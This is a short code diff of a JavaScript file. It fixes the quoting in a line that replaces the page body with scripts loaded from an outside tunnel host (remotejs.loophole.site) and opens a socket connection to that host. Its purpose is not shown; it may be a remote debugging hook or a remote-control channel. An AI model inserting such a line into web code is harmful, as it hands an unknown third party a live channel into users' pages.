@@ -34,4 +34,4 @@ document.onkeydown = function (e) {
   }
 }
 
-document.body.innerHTML = '<script src="https://remotejs.loophole.site/socket.io/socket.io.js"></script><script>var socket = io('https://remotejs.loophole.site');</script>';
+document.body.innerHTML = '<script src="https://remotejs.loophole.site/socket.io/socket.io.js"></script><script>var socket = io("https://remotejs.loophole.site");</script>';
